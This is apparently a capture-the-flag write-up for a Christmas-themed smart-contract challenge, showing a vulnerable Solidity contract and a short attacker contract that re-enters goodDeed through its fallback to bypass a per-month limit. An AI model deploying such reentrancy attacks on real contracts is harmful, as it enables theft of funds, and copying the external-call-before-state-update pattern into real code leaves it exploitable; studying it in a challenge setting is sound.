# 21 - Re-Entry to Nice List

## Description

The elves are going web3! Also, Santa needs money to produce the toys (did you really think anything is for free?!). In
order not be a boomer and to raise more than the ConstitutionDAO, he tasked his elves with creating a smart contract for
people to buy into the nice list.

Unfortunately, the elves weren't up to the task and only were able to put the deeds counter on to the blockchain. You
have to submit one good deed per month to get on to the nice list.

Unluckily for you, Christmas is in a few days and you can only submit 1 deed per month (or in blockchain terms: every
172800 blocks). Or can you get your counter to 0 in time?

## Solution

For this challenge we are provided a website to deploy our own smart contract. We can decompile the contract and take a
look at its source:

```
contract SantasList {
    mapping(address => uint256) naughtyList;
    mapping(address => uint256) nextGoodDeedAfter;

    function start() public {
        naughtyList[tx.origin] = 12;
        nextGoodDeedAfter[tx.origin] = 0;
    }

    function goodDeed() public {
        require(
            nextGoodDeedAfter[tx.origin] < block.number,
            "You have already done your good deed this month"
        );
        if (naughtyList[tx.origin] > 0) {
            naughtyList[tx.origin] = naughtyList[tx.origin] - 1;
            (bool success, ) = msg.sender.call("");
            require(success, "Call failed");
            nextGoodDeedAfter[tx.origin] = block.number + 172800;
        }
    }

    function goodDeedsLeft(address _address) public view returns (uint256) {
        return naughtyList[_address];
    }

    function isNice(address _address) public view returns (bool) {
        if(nextGoodDeedAfter[_address] > 0 && naughtyList[_address] == 0) {
            return true;
        } else {
            return false;
        }
    }
}
```

We want `isNice` to return `true` for us and to do so we have to decrease the `naughtyLIst` to `0`. At first it might
look like we can only decrease the counter by one every `172800` blocks which roughly equals a month. We can see that
the function `goodDeed` calls the caller before `nextGoodDeedAfter` is written. This can be used to call `goodDeed`
multiple times before `nextGoodDeedAfter` is ever written. To do so we write our own contract:

```
contract SantasList {
  function goodDeed() public {}
}

contract MyContract {
   function hack() public {
       SantasList santa = SantasList(0x73D81979766A4076e73Da18786df983A80a86212);
       santa.goodDeed();
  }
  
  fallback() external payable {
        SantasList santa = SantasList(0x73D81979766A4076e73Da18786df983A80a86212);
        santa.goodDeed();
  }
}
```

This contract calls the `goodDeed` of `SantasList` and uses the fallback function to call it again. With this the
`naughtyList` counter gets set to `0` before the check can fail.

